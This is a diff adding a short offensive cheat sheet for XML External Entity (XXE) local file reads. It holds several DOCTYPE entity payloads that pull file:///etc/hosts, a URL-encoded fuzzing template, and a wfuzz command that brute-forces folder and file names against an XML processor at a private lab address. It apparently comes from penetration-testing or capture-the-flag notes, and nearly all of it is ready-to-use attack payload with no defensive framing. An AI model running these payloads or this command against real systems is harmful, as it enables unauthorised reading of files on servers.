@@ -1,0 +1,15 @@
+~~~ Local File Read  ~~~
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file://FUZZFUZ2Z" >]><foo>&xxe;</foo>
+
+%3C%3Fxml%20version%3D%221%2E0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FFUZZFUZ2Z%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E
+
+cnoio_wfuzz -z file,/shared/lists/root_folders.txt -z file,/shared/lists/file_names.txt --hc 500 --hl 15 -d "xml=%3C%3Fxml%20version%3D%221%2E0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FFUZZFUZ2Z%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E" http://10.0.2.36:8081/xml_report_processor
+
